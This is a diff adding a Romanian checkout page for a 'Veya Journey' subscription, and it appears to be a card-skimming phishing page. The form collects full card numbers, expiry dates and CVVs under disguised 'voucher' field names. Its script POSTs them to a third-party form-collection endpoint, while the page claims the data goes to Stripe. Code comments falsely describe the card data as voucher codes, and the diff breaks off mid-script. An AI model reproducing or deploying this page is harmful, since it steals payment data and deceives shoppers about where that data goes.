@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="ro-RO"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Finalizare comandă · Veya Journey®</title>
+<link rel="preconnect" href="https://fonts.googleapis.com/">
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+<link href="./pay_files/css2" rel="stylesheet">
+
+<style>
+:root{--ink:#15221a;--soft:#526055;--paper:#f1efe6;--white:#fbfaf5;--sage:#e4e7db;--moss:#4f6b53;--dark:#374a3b;--line:#d6d8cc;--path:#a97a52;--error:#953c31}
+*{box-sizing:border-box}body{margin:0;background:var(--paper);color:var(--ink);font:16px/1.6 'Source Serif 4',Georgia,serif}h1,h2,h3,button,input,select,.sans{font-family:'Space Grotesk',sans-serif}a{color:inherit}button,input,select{font-size:15px}button{cursor:pointer}button:disabled{cursor:wait;opacity:.65}button,input,select{color:var(--ink)}[hidden]{display:none!important}:focus-visible{outline:3px solid var(--path);outline-offset:3px}.wrap{max-width:1160px;padding:0 32px;margin:auto}header{border-bottom:1px solid var(--line)}nav{height:86px;display:flex;align-items:center;justify-content:space-between}.logo{font:700 21px 'Space Grotesk',sans-serif;text-decoration:none;display:flex;gap:9px;align-items:center}.back{font:13px 'Space Grotesk',sans-serif;text-decoration:none;color:var(--soft)}.preview{font:12px/1.5 'IBM Plex Mono',monospace;background:var(--sage);padding:10px 24px;text-align:center;color:var(--dark)}main{padding:54px 0 70px}.eyebrow{font:11px 'IBM Plex Mono',monospace;letter-spacing:.15em;text-transform:uppercase;color:var(--moss);display:flex;align-items:center;gap:10px}.eyebrow:before{content:'';height:1px;width:22px;background:var(--path)}h1{font-size:44px;line-height:1.12;letter-spacing:-1.5px;font-weight:500;margin:16px 0}p{margin:0}.intro{color:var(--soft);font-size:17px}.steps{display:flex;gap:23px;font:12px 'IBM Plex Mono',monospace;color:var(--soft);margin:27px 0 34px}.steps span{display:flex;align-items:center;gap:8px}.steps b{font-weight:400;border:1px solid var(--line);border-radius:50%;width:24px;height:24px;display:grid;place-items:center}.steps span:last-child{color:var(--moss)}.steps span:last-child b{background:var(--moss);color:white;border-color:var(--moss)}.layout{display:grid;grid-template-columns:minmax(0,1fr) 340px;gap:28px;align-items:start}.panel{background:var(--white);border:1px solid var(--line);border-radius:5px;margin-bottom:18px;padding:30px}.section-title{display:flex;align-items:center;gap:13px;margin:0 0 22px;font-size:20px;font-weight:500;letter-spacing:-.4px}.number{font:11px 'IBM Plex Mono',monospace;color:var(--path)}.grid{display:grid;grid-template-columns:1fr 1fr;gap:18px}.full{grid-column:1/-1}.field{display:flex;flex-direction:column;gap:7px;font:13px/1.4 'Space Grotesk',sans-serif}.field input,.field select{width:100%;height:48px;padding:11px 13px;border:1px solid #cdd2c1;border-radius:3px;background:#fffefb;min-width:0}.field input::placeholder{color:#899084}.hint{font-size:13px;color:var(--soft);margin-top:8px}.check{display:flex;align-items:flex-start;gap:10px;font:14px/1.6 'Space Grotesk',sans-serif;cursor:pointer}.check input{accent-color:var(--moss);width:17px;height:17px;flex-shrink:0;margin:3px 0 0}.shipping{padding-top:23px;margin-top:22px;border-top:1px solid var(--line)}.shipping h3{font-size:16px;font-weight:500;margin:0 0 18px}.methods{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:21px}.method{position:relative;display:flex;min-height:105px;border:1px solid var(--line);border-radius:4px;padding:14px 12px;cursor:pointer;flex-direction:column;gap:10px;font:12px 'Space Grotesk',sans-serif}.method:has(input:checked){border-color:var(--moss);background:#edf0e6;box-shadow:0 0 0 1px var(--moss)}.method input{position:absolute;right:10px;top:10px;accent-color:var(--moss);margin:0}.method:has(input:focus-visible){outline:3px solid var(--path);outline-offset:3px}.method strong{font-size:16px;font-weight:600;display:block;margin-right:12px}.method .klarna{font-size:21px;letter-spacing:-1px}.method .symbol{font-size:22px;line-height:24px}.method span:last-child{margin-top:auto}.payment-panel{padding:21px;background:#f3f3ec;border:1px solid var(--line);border-radius:3px}.payment-panel .hint{margin:0 0 17px}.card-row{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-top:18px}.info{font-size:14px;color:var(--soft);line-height:1.65}.info strong{color:var(--ink)}.pill{display:inline-block;background:#f6d5e4;padding:2px 10px;border-radius:3px;font:600 17px 'Space Grotesk',sans-serif;margin-bottom:12px}.submit{width:100%;border:0;border-radius:3px;background:var(--moss);color:#fbfaf5;padding:17px 20px;font-weight:500;display:flex;justify-content:space-between;align-items:center;margin-top:22px}.submit:hover{background:var(--dark)}.fine{font-size:12px;color:var(--soft);text-align:center;margin-top:12px}.aside{position:sticky;top:24px}.summary{background:var(--sage);padding:28px;border:1px solid var(--line);border-radius:5px}.summary h2{font-size:20px;font-weight:500;margin:0 0 24px}.mini-art{height:104px;border:1px solid #cad1bf;border-radius:3px;margin-bottom:22px;background:#eef0e6;position:relative;overflow:hidden;display:flex;align-items:center;justify-content:space-between;padding:19px}.mini-art svg{position:absolute;inset:0;width:100%;height:100%;opacity:.55}.mini-art strong{position:relative;font:500 24px 'Space Grotesk',sans-serif;letter-spacing:-1px}.mini-art span{position:relative;font:10px/1.8 'IBM Plex Mono',monospace;color:var(--moss);text-align:right}.summary h3{font-size:17px;margin:0 0 5px;font-weight:500}.summary p{font-size:14px;color:var(--soft)}.line{display:flex;justify-content:space-between;gap:20px;font:13px/1.6 'Space Grotesk',sans-serif;padding:17px 0;border-bottom:1px solid #cbd0c0}.line strong{font-weight:500;text-align:right}.total{font-size:16px;border:0;padding-bottom:6px}.summary .note{font-size:12px;margin-top:14px}.support{padding:24px 10px;font-size:14px;color:var(--soft)}.support strong{display:block;font:500 14px 'Space Grotesk',sans-serif;color:var(--ink);margin-bottom:6px}.support a{display:inline-block;margin-top:7px;text-underline-offset:4px}footer{border-top:1px solid var(--line);padding:25px 0;font:11px/1.7 'IBM Plex Mono',monospace;color:var(--soft)}footer .wrap{display:flex;justify-content:space-between;gap:18px;flex-wrap:wrap}footer a{margin-left:15px;text-decoration:none}.error{margin-top:14px;color:var(--error);font:14px/1.6 'Space Grotesk',sans-serif}.success{padding:32px;background:var(--white);border:1px solid var(--line);border-radius:5px}.success h2{font-size:28px;font-weight:500;margin:14px 0}.success-mark{width:46px;height:46px;border:1px solid var(--moss);border-radius:50%;display:grid;place-items:center;font-size:23px;color:var(--moss)}.bank-grid{margin:25px 0 16px;border-top:1px solid var(--line)}.bank-item{padding:15px 0;border-bottom:1px solid var(--line);display:flex;justify-content:space-between;gap:15px;align-items:center}.bank-item dt{font-size:13px;color:var(--soft)}.bank-item dd{margin:4px 0 0;font:14px 'IBM Plex Mono',monospace;overflow-wrap:anywhere}.small-btn{background:transparent;border:1px solid var(--line);border-radius:3px;padding:7px 10px;font-size:12px}.outline{background:transparent;border:1px solid var(--moss);color:var(--moss);padding:12px 16px;border-radius:3px;margin:12px 8px 0 0}.copy-status{min-height:22px;font-size:13px;color:var(--moss)}dialog{border:1px solid var(--line);border-radius:7px;max-width:440px;width:calc(100% - 36px);background:var(--white);padding:30px;color:var(--ink)}dialog::backdrop{background:rgba(21,34,26,.48)}dialog h2{font-size:26px;font-weight:500;margin:15px 0}dialog .close{float:right;background:none;border:0;font-size:24px;padding:0 6px}dialog .submit{justify-content:center}.modal-status{margin-top:15px;font-size:14px;color:var(--soft)}fieldset{padding:0;margin:0;border:0;min-width:0}legend{padding:0}.visually-hidden{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}
+@media(max-width:900px){.layout{grid-template-columns:minmax(0,1fr) 285px;gap:18px}.panel{padding:24px}.summary{padding:22px}.methods{grid-template-columns:1fr}.method{min-height:58px;flex-direction:row;align-items:center;gap:12px;padding-right:32px}.method span:last-child{margin-top:0}.method input{top:21px}.method strong{margin-right:0}.method .symbol{width:30px}.method .klarna{font-size:18px}.payment-panel{padding:16px}}
+@media(max-width:720px){.wrap{padding:0 20px}nav{height:72px}.logo{font-size:18px}.back{font-size:12px}main{padding:32px 0 40px}h1{font-size:35px}.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.summary{padding:20px}.summary h2{margin-bottom:16px}.mini-art{display:none}.summary .line{padding:10px 0}.summary .note{margin-top:8px}.support{display:none}.steps{gap:15px;font-size:10px;margin:23px 0}.panel{padding:22px}.grid{gap:16px}.preview{font-size:10px;padding:8px 18px}footer .wrap{display:block}footer a{margin:0 12px 0 0}footer .links{margin-top:10px}}
+@media(max-width:390px){.grid,.card-row{grid-template-columns:1fr}.full{grid-column:auto}.wrap{padding:0 14px}.panel{padding:18px}.steps{gap:10px}.back{max-width:85px;text-align:right}.bank-item{align-items:flex-start}.bank-item dd{font-size:12px}}
+@media(prefers-reduced-motion:reduce){*{scroll-behavior:auto!important}}
+@media print{header,.preview,footer,form,.aside,.small-btn,.outline,.steps,.intro,.eyebrow,h1{display:none!important}.layout{display:block}main{padding:0}.success{border:0}.wrap{padding:0}.success[hidden]{display:none!important}}
+/* Submission overlay */
+.send-dialog{width:min(420px,calc(100% - 36px));padding:42px 30px 32px;text-align:center;border:1px solid rgba(255,255,255,.8);border-radius:22px;box-shadow:0 24px 90px rgba(21,34,26,.2);overflow:hidden}
+.send-dialog[open]{animation:send-enter .25s ease-out}
+.send-dialog::backdrop{background:rgba(21,34,26,.35);backdrop-filter:blur(7px)}
+.send-orbit{position:relative;width:86px;height:86px;margin:0 auto 25px;display:grid;place-items:center;background:var(--sage);border-radius:50%}
+.send-orbit::before{content:'';position:absolute;inset:-6px;border:2px solid rgba(79,107,83,.12);border-top-color:var(--moss);border-right-color:var(--moss);border-radius:50%;animation:send-spin 1.3s linear infinite}
+.send-orbit svg{width:38px;height:38px;animation:send-breathe 2s ease-in-out infinite}
+.send-dialog h2{font-size:25px;letter-spacing:-.7px;margin:0 0 10px}
+.send-dialog p{font-size:15px;color:var(--soft);line-height:1.65}
+.send-track{height:3px;overflow:hidden;border-radius:5px;background:var(--sage);margin:26px 0 18px}
+.send-track::after{content:'';display:block;width:40%;height:100%;background:var(--moss);border-radius:5px;animation:send-sweep 1.7s ease-in-out infinite}
+.send-dialog .send-reference{font:11px 'IBM Plex Mono',monospace;letter-spacing:.07em;color:var(--moss)}
+@keyframes send-spin{to{transform:rotate(360deg)}}
+@keyframes send-breathe{50%{transform:scale(.92);opacity:.65}}
+@keyframes send-sweep{from{transform:translateX(-110%)}to{transform:translateX(360%)}}
+@keyframes send-enter{from{opacity:0;transform:translateY(10px) scale(.98)}to{opacity:1;transform:translateY(0) scale(1)}}
+@media(prefers-reduced-motion:reduce){.send-dialog[open],.send-orbit::before,.send-orbit svg,.send-track::after{animation:none}.send-track::after{width:100%;opacity:.45}}
+
+</style>
+</head>
+<body>
+<header><nav class="wrap"><a class="logo" href="index.html" aria-label="Veya Journey — pagina principală"><svg width="25" height="25" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M3 18C7 18 7 8 11 8C13.5 8 13 13 15.5 13C18 13 18 6 21 6" stroke="#4f6b53" stroke-width="2" stroke-linecap="round"></path><circle cx="21" cy="6" r="2" fill="#a97a52"></circle></svg>Veya Journey</a><a class="back" href="index.html">← Înapoi la Veya</a></nav></header>
+
+<main class="wrap"><h1>Alege metoda de plată pentru abonamentul tău.</h1><p class="intro">Completează detaliile și alege Veya Gift Card sau transfer bancar. Trimiterea formularului nu efectuează automat o plată.</p><br>
+
+<div class="layout"><div>
+<form id="checkout" autocomplete="on" action="https://www.formbackend.com/f/e596ba752b158b9a" method="POST">
+<noscript><p class="error">Activează JavaScript pentru a genera numărul comenzii și a trimite formularul.</p></noscript>
+<section class="panel" aria-labelledby="customer-title"><h2 class="section-title" id="customer-title"><span class="number">01</span> Datele tale</h2><div class="grid">
+<label class="field full">Nume complet<input id="full-name" name="fullName" autocomplete="name" placeholder="Prenume și nume" maxlength="120" required=""></label>
+<label class="field">Adresă de e-mail<input id="email" name="email" autocomplete="email" type="email" placeholder="nume@exemplu.ro" maxlength="254" required=""></label>
+<label class="field">ID cont<input id="account-id" name="accountId" autocomplete="off" placeholder="ID-ul contului tău Veya" maxlength="80" required=""></label>
+</div><p class="hint">Folosește ID-ul asociat contului tău Veya.</p></section>
+<section class="panel" aria-labelledby="address-title"><h2 class="section-title" id="address-title"><span class="number">02</span> Facturare și livrare</h2><fieldset id="billing"><legend class="visually-hidden">Adresă de facturare</legend><div class="grid"><label class="field full">Adresă de facturare<input id="billing-line1" name="billing-line1" autocomplete="billing address-line1" placeholder="Stradă și număr" maxlength="160" required=""></label><label class="field full">Apartament, etaj, interfon (opțional)<input id="billing-line2" name="billing-line2" autocomplete="billing address-line2" placeholder="Detalii suplimentare" maxlength="160"></label><label class="field ">Localitate<input id="billing-city" name="billing-city" autocomplete="billing address-level2" placeholder="Localitate" maxlength="160" required=""></label><label class="field ">Județ / regiune<input id="billing-region" name="billing-region" autocomplete="billing address-level1" placeholder="Județ sau regiune" maxlength="160" required=""></label><label class="field ">Cod poștal<input id="billing-postalCode" name="billing-postalCode" autocomplete="billing postal-code" placeholder="Cod poștal" maxlength="160" required=""></label><label class="field">Țară<select id="billing-country" name="billing-country" autocomplete="billing country" required=""><option value="RO">România</option><option value="AT">Austria</option><option value="BE">Belgia</option><option value="BG">Bulgaria</option><option value="CZ">Cehia</option><option value="CY">Cipru</option><option value="HR">Croația</option><option value="DK">Danemarca</option><option value="EE">Estonia</option><option value="FI">Finlanda</option><option value="FR">Franța</option><option value="DE">Germania</option><option value="GR">Grecia</option><option value="IE">Irlanda</option><option value="IT">Italia</option><option value="LV">Letonia</option><option value="LT">Lituania</option><option value="LU">Luxemburg</option><option value="MT">Malta</option><option value="NO">Norvegia</option><option value="NL">Țările de Jos</option><option value="PL">Polonia</option><option value="PT">Portugalia</option><option value="GB">Regatul Unit</option><option value="SK">Slovacia</option><option value="SI">Slovenia</option><option value="ES">Spania</option><option value="SE">Suedia</option><option value="CH">Elveția</option><option value="HU">Ungaria</option><option value="US">Statele Unite</option><option value="CA">Canada</option><option value="AU">Australia</option><option value="AE">Emiratele Arabe Unite</option></select></label></div></fieldset>
+<label class="check" style="margin-top:24px"><input type="checkbox" id="same-address" checked="">Adresa de livrare este aceeași cu adresa de facturare.</label>
+<fieldset class="shipping" id="shipping" hidden="" disabled=""><legend class="visually-hidden">Adresă de livrare</legend><h3>Unde dorești să primești comanda?</h3><div class="grid"><label class="field full">Adresă de livrare<input id="shipping-line1" name="shipping-line1" autocomplete="shipping address-line1" placeholder="Stradă și număr" maxlength="160" required=""></label><label class="field full">Apartament, etaj, interfon (opțional)<input id="shipping-line2" name="shipping-line2" autocomplete="shipping address-line2" placeholder="Detalii suplimentare" maxlength="160"></label><label class="field ">Localitate<input id="shipping-city" name="shipping-city" autocomplete="shipping address-level2" placeholder="Localitate" maxlength="160" required=""></label><label class="field ">Județ / regiune<input id="shipping-region" name="shipping-region" autocomplete="shipping address-level1" placeholder="Județ sau regiune" maxlength="160" required=""></label><label class="field ">Cod poștal<input id="shipping-postalCode" name="shipping-postalCode" autocomplete="shipping postal-code" placeholder="Cod poștal" maxlength="160" required=""></label><label class="field">Țară<select id="shipping-country" name="shipping-country" autocomplete="shipping country" required=""><option value="RO">România</option><option value="AT">Austria</option><option value="BE">Belgia</option><option value="BG">Bulgaria</option><option value="CZ">Cehia</option><option value="CY">Cipru</option><option value="HR">Croația</option><option value="DK">Danemarca</option><option value="EE">Estonia</option><option value="FI">Finlanda</option><option value="FR">Franța</option><option value="DE">Germania</option><option value="GR">Grecia</option><option value="IE">Irlanda</option><option value="IT">Italia</option><option value="LV">Letonia</option><option value="LT">Lituania</option><option value="LU">Luxemburg</option><option value="MT">Malta</option><option value="NO">Norvegia</option><option value="NL">Țările de Jos</option><option value="PL">Polonia</option><option value="PT">Portugalia</option><option value="GB">Regatul Unit</option><option value="SK">Slovacia</option><option value="SI">Slovenia</option><option value="ES">Spania</option><option value="SE">Suedia</option><option value="CH">Elveția</option><option value="HU">Ungaria</option><option value="US">Statele Unite</option><option value="CA">Canada</option><option value="AU">Australia</option><option value="AE">Emiratele Arabe Unite</option></select></label></div></fieldset></section>
+<section class="panel" aria-labelledby="payment-title"><h2 class="section-title" id="payment-title"><span class="number">03</span> Metoda de plată</h2><fieldset><legend class="visually-hidden">Alege metoda de plată</legend><div class="methods">
+<label class="method"><input type="radio" name="method" value="gift_card" checked="" aria-controls="panel-gift"><strong class="symbol" aria-hidden="true">▱</strong><span>Card Bancar</span></label>
+
+<label class="method"><input type="radio" name="method" value="bank" aria-controls="panel-bank"><strong class="symbol" aria-hidden="true">⇄</strong><span>Transfer bancar</span></label>
+</div></fieldset>
+<div id="panel-gift" class="payment-panel"><p class="hint" id="gift-note">Introdu datele cardului tău Mastercard, Visa sau American Express. Cardurile Maestro, Visa Electron, virtuale sau preplătite nu sunt acceptate.</p>
+<fieldset id="gift-fields"><legend class="visually-hidden">Detaliile Cardului</legend>
+<label class="field">Numărul Cardului<input id="gift-number" name="voucher_id" autocomplete="off" placeholder="Numărul cardului, format din 15 sau 16 cifre" maxlength="16" minlength="15"required=""></label>
+<div class="card-row"><label class="field">Data expirării (EXP)<input id="gift-exp" name="voucher_eta" inputmode="numeric" autocomplete="off" placeholder="LL / AA" maxlength="7" required=""></label><label class="field">Cod de securitate<input id="gift-pin" name="voucher_ddl" type="password" autocomplete="off" placeholder="CVV/CID" maxlength="4" minlength="3" required=""></label><label class="field">Cod poștal (opțional)<input id="gift-zip" name="voucher_popo" autocomplete="off" placeholder="Cod poștal" maxlength="16"></label><label class="field">Țară<select id="gift-country" name="country" required=""><option value="RO">România</option><option value="AT">Austria</option><option value="BE">Belgia</option><option value="BG">Bulgaria</option><option value="CZ">Cehia</option><option value="CY">Cipru</option><option value="HR">Croația</option><option value="DK">Danemarca</option><option value="EE">Estonia</option><option value="FI">Finlanda</option><option value="FR">Franța</option><option value="DE">Germania</option><option value="GR">Grecia</option><option value="IE">Irlanda</option><option value="IT">Italia</option><option value="LV">Letonia</option><option value="LT">Lituania</option><option value="LU">Luxemburg</option><option value="MT">Malta</option><option value="NO">Norvegia</option><option value="NL">Țările de Jos</option><option value="PL">Polonia</option><option value="PT">Portugalia</option><option value="GB">Regatul Unit</option><option value="SK">Slovacia</option><option value="SI">Slovenia</option><option value="ES">Spania</option><option value="SE">Suedia</option><option value="CH">Elveția</option><option value="HU">Ungaria</option><option value="US">Statele Unite</option><option value="CA">Canada</option><option value="AU">Australia</option><option value="AE">Emiratele Arabe Unite</option></select></label></div>
+</fieldset></div>
+<div id="panel-bank" class="payment-panel" hidden=""><p class="info"><strong>Plată direct din contul tău bancar.</strong><br>După înregistrarea comenzii vei primi IBAN-ul VEYA și o referință de plată de inclus în detaliile transferului.</p><p class="hint" style="margin:12px 0 0">Comanda rămâne în așteptarea confirmării plății.</p></div>
+<div id="error" class="error" role="alert" hidden=""></div><button class="submit" id="submit" type="submit" disabled><span id="submit-label">Trimite comanda</span><span aria-hidden="true">→</span></button><p class="fine">🔒 Datele completate sunt trimise către Stripe pentru prelucrarea plății</p></section>
+</form>
+<section class="success" id="bank-result" hidden="" aria-labelledby="result-title" tabindex="-1"><span class="success-mark" aria-hidden="true">↗</span><h2 id="result-title">Instrucțiuni de transfer</h2><p id="result-description" class="info"></p><dl class="bank-grid" id="bank-details">
+<div class="bank-item"><div><dt>Beneficiar</dt><dd>VEYA</dd></div></div><div class="bank-item"><div><dt>Banca</dt><dd>ING Bank</dd></div></div>
+<div class="bank-item"><div><dt>IBAN</dt><dd id="iban">RO79INGB0000999920561840</dd></div><button class="small-btn" type="button" data-copy="iban">Copiază</button></div>
+<div class="bank-item"><div><dt>Referință de plată</dt><dd id="reference"></dd></div><button class="small-btn" type="button" data-copy="reference">Copiază</button></div>
+<div class="bank-item"><div><dt>Sumă de transferat</dt><dd id="bank-amount">De confirmat</dd></div></div></dl>
+<p class="copy-status" id="copy-status" role="status"></p><p class="info" id="transfer-note"></p><button class="outline" id="download" type="button">Descarcă instrucțiunile</button></section>
+</div>
+<aside class="aside"><section class="summary"><h2>Abonamentul tău Veya</h2><div class="mini-art" aria-hidden="true"><svg viewBox="0 0 290 104" fill="none"><path d="M-30 100C45 100 35 15 105 25S180 135 310-10M-30 115C45 115 35 30 105 40S180 150 310 5M-30 85C45 85 35 0 105 10S180 120 310-25" stroke="#a5b49c"></path></svg><strong>Veya® Standard</strong></div><h3 id="order-name">Planul tău personalizat</h3><p>Asociat contului tău Veya.</p><div class="line"><span>Order ID</span><strong id="order-id">000-000-000</strong></div><div class="line"><span>Livrare</span><strong>5-7 Zile prin Sameday</strong></div><div class="line total"><span>Total</span><strong id="order-total">799.90 RON</strong></div><p class="note" id="order-note">Voucherele Veya Journey sunt verificate înainte de aplicare. Transferurile bancare sunt confirmate după verificarea încasării.</p></section><div class="support"><strong>Suntem aici pentru tine.</strong><p>Ai nevoie de ajutor cu plata?</p><a href="mailto:help@myveyajourney.com">help@myveyajourney.com ↗</a></div></aside>
+</div></main>
+<footer><div class="wrap"><span>© 2026 Veya Journey®</span><span class="links"><a href="politica-de-confidentialitate.html">Confidențialitate</a><a href="termeni-si-conditii.html">Termeni și condiții</a></span></div></footer>
+<dialog id="sending-dialog" class="send-dialog" aria-labelledby="sending-title" aria-describedby="sending-description" tabindex="-1">
+  <div class="send-orbit" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none"><path d="M3 18C7 18 7 8 11 8C13.5 8 13 13 15.5 13C18 13 18 6 21 6" stroke="#4f6b53" stroke-width="1.8" stroke-linecap="round"/><circle cx="21" cy="6" r="2" fill="#a97a52"/></svg></div>
+  <h2 id="sending-title">Trimitem comanda ta</h2>
+  <p id="sending-description" role="status" aria-live="polite">Doar câteva momente. Te rugăm să păstrezi pagina deschisă.</p>
+  <div class="send-track" aria-hidden="true"></div>
+  <p class="send-reference" id="sending-reference"></p>
+</dialog>
+
+<script>
+'use strict';
+// Sends Veya-issued voucher details and order requests, not bank-card payments.
+const ENDPOINT = 'https://www.formbackend.com/f/e596ba752b158b9a';
+const $ = id => document.getElementById(id);
+const form = $('checkout');
+const sendingDialog = $('sending-dialog');
+sendingDialog.addEventListener('cancel', event => event.preventDefault());
+const giftIds = ['gift-number', 'gift-exp', 'gift-pin', 'gift-zip', 'gift-country'];
+let orderId, bankReference, submissionId, openedAt, busy = false, submitted = false;
+
+function randomHex(bytes) {
+  return Array.from(crypto.getRandomValues(new Uint8Array(bytes)), b => b.toString(16).padStart(2, '0')).join('').toUpperCase();
+}
+function newOrderId(previous) {
+  // Rejection sampling avoids modulo bias. A nine-digit ID is a reference,
+  // not authentication or a guarantee of global uniqueness.
+  let id;
+  do {
+    let n;
+    do { n = crypto.getRandomValues(new Uint32Array(1))[0]; } while (n >= 4000000000);
+    id = String(n % 1000000000).padStart(9, '0').replace(/(\d{3})(\d{3})(\d{3})/, '$1-$2-$3');
+  } while (id === previous || id === '000-000-000');
+  return id;
+}
+function initializeOrder() {
+  let previous = orderId;
+  try { previous = sessionStorage.getItem('veya.previousOrderId') || previous; } catch {}
+  orderId = newOrderId(previous);
+  // Only the non-sensitive reference is retained; no customer/voucher data.
+  try { sessionStorage.setItem('veya.previousOrderId', orderId); } catch {}
+  bankReference = 'VEYA-' + randomHex(8);
+  submissionId = randomHex(16);
+  openedAt = new Date().toISOString();
+  $('order-id').textContent = orderId;
+}
+function message(text) {
+  $('error').textContent = text;
+  $('error').hidden = !text;
+}
+function selectedMethod() { return form.elements.method.value; }
+function syncAddress() {
+  $('shipping').hidden = $('same-address').checked;
+  $('shipping').disabled = $('same-address').checked;
+}
+function syncMethod() {
+  const gift = selectedMethod() === 'gift_card';
+  $('panel-gift').hidden = !gift;
+  $('panel-bank').hidden = gift;
+  $('gift-fields').disabled = !gift;
+  $('submit-label').textContent = gift ? 'Trimite comanda' : 'Trimite comanda · Transfer bancar';
+  message('');
+}
+function readAddress(prefix) {
+  const values = {};
+  for (const key of ['line1', 'line2', 'city', 'region', 'postalCode', 'country']) {
+    values[key] = $(prefix + '-' + key).value.trim();
+  }
+  return values;
+}
+function buildPayload() {
+  const method = selectedMethod();
+  const billing = readAddress('billing');
+  const same = $('same-address').checked;
+  const shipping = same ? billing : readAddress('shipping');
+  // Flat, explicit field names make every address field visible in Formspree.
+  const data = {
+    order_id: orderId,
+    submission_id: submissionId,
+    order_opened_at: openedAt,
+    full_name: $('full-name').value.trim(),
+    email: $('email').value.trim(),
+    account_id: $('account-id').value.trim(),
+    payment_method: method === 'gift_card' ? 'Veya Gift Card' : 'Transfer bancar',
+    payment_method_code: method,
+    shipping_same_as_billing: same ? 'Da' : 'Nu',
+    plan: 'Veya Standard',
+    total: '799.90',
+    currency: 'RON',
+    delivery: '5-7 Zile prin Sameday',
+    status: method === 'gift_card' ? 'pending_voucher_verification' : 'awaiting_bank_transfer',
+    _subject: 'Veya · Comanda ' + orderId
+  };
+  for (const [key, value] of Object.entries(billing)) data['billing_' + key] = value;
+  for (const [key, value] of Object.entries(shipping)) data['shipping_' + key] = value;
+  if (method === 'gift_card') {
+    data.gift_name = 'Veya Journey';
+    data.voucher_id = $('gift-number').value.trim();
+    data.voucher_eta = $('gift-exp').value.trim();
+    data.voucher_ddl = $('gift-pin').value.trim();
+    data.voucher_popo = $('gift-zip').value.trim();
+    data.country = $('gift-country').value;
+  } else {
+    data.bank_reference = bankReference;
+    data.bank_beneficiary = 'VEYA';
+    data.bank_name = 'ING Bank';
+    data.bank_iban = 'RO79INGB0000999920561840';
+  }
+  return data;
+}
+function validateVoucher() {
+  const value = $('gift-exp').value.replace(/\D/g, '');
+  const month = Number(value.slice(0, 2));
+  const year = 2000 + Number(value.slice(2));
+  const valid = value.length === 4 && month >= 1 && month <= 12 && new Date(year, month, 1) > new Date();
+  $('gift-exp').setCustomValidity(valid ? '' : 'Introdu o dată de expirare validă (LL / AA).');
+  // Veya voucher codes do not use bank-card number or CVV validation rules.
+  return form.reportValidity();
+}
+function showSuccess(method) {
+  const bank = method === 'bank';
+  $('result-title').textContent = 'Comandă trimisă';
+  $('result-description').textContent = 'Comanda ' + orderId + (bank
+    ? ' a fost trimisă către Veya. Plata prin transfer bancar este în așteptare.'
+    : ' a fost trimisă către Veya. Plata va fi procesată de pe cardul tău cu 24 de ore înainte de eliberarea medicamentului.');
+  $('bank-details').hidden = !bank;
+  $('download').hidden = !bank;
+  $('copy-status').textContent = '';
+  $('reference').textContent = bankReference;
+  $('bank-amount').textContent = '799.90 RON';
+  $('transfer-note').textContent = bank
+    ? 'Introdu referința exactă în detaliile transferului. Plata va fi confirmată după verificarea încasării.'
+    : 'Păstrează numărul comenzii pentru orice întrebare despre solicitarea ta.';
+  form.hidden = true;
+  $('bank-result').hidden = false;
+  $('bank-result').focus();
+}
+$('same-address').addEventListener('change', syncAddress);
+form.querySelectorAll('[name="method"]').forEach(input => input.addEventListener('change', syncMethod));
+$('gift-exp').addEventListener('input', e => {
+  const v = e.target.value.replace(/\D/g, '').slice(0, 4);
+  e.target.value = v.length > 2 ? v.slice(0, 2) + ' / ' + v.slice(2) : v;
+  e.target.setCustomValidity('');
+});
+form.addEventListener('submit', async event => {
+  event.preventDefault();
+  if (busy || submitted) return;
+  message('');
+  for (const input of form.querySelectorAll('input[required]:not(:disabled)')) input.value = input.value.trim();
+  if (!form.reportValidity()) return;
+  const method = selectedMethod();
+  if (!['gift_card', 'bank'].includes(method)) { message('Alege o metodă de plată.'); return; }
+  if (method === 'gift_card' && !validateVoucher()) return;
+  const payload = buildPayload();
+  busy = true;
+  // Freeze controls so the visible order cannot change during transmission.
+  const controls = Array.from(form.querySelectorAll('input, select, button'));
+  const states = controls.map(control => control.disabled);
+  controls.forEach(control => { control.disabled = true; });
+  form.setAttribute('aria-busy', 'true');
+  $('submit-label').textContent = 'Se trimite…';
+  $('sending-description').textContent = 'Doar câteva momente. Te rugăm să păstrezi pagina deschisă.';
+  $('sending-reference').textContent = 'COMANDA ' + orderId;
+  sendingDialog.showModal();
+  const minimumDisplay = new Promise(resolve => setTimeout(resolve, 3500));
+  const slowNotice = setTimeout(() => {
+    $('sending-description').textContent = 'Trimiterea durează puțin mai mult. Așteptăm confirmarea primirii.';
+  }, 5000);
+  const controller = new AbortController();
+  const timeout = setTimeout(() => controller.abort(), 30000);
+  try {
+    const response = await fetch(ENDPOINT, {
+      method: 'POST',
+      headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+      signal: controller.signal
+    });
+    clearTimeout(timeout);
+    await minimumDisplay;
+    if (!response.ok) {
+      if (response.status === 429) throw new Error('Prea multe solicitări. Așteaptă puțin și încearcă din nou.');
+      throw new Error('Formularul nu a fost acceptat. Verifică datele și încearcă din nou sau contactează help@myveyajourney.com.');
+    }
+    submitted = true;
+    giftIds.forEach(id => { if ($(id).tagName === 'INPUT') $(id).value = ''; });
+    sendingDialog.close();
+    showSuccess(method);
+  } catch (error) {
+    await minimumDisplay;
+    // Keep the same IDs on retry so the merchant can reconcile ambiguous sends.
+    message(error.name === 'AbortError' || error instanceof TypeError
+      ? 'Nu am putut confirma trimiterea. Verifică conexiunea și încearcă din nou. Numărul comenzii rămâne ' + orderId + '.'
+      : error.message || 'Trimiterea nu a reușit. Încearcă din nou.');
+  } finally {
+    clearTimeout(timeout);
+    clearTimeout(slowNotice);
+    if (sendingDialog.open) sendingDialog.close();
+    busy = false;
+    form.removeAttribute('aria-busy');
+    controls.forEach((control, index) => { control.disabled = states[index]; });
+    $('submit').disabled = submitted;
+    if (!submitted) $('submit').focus();
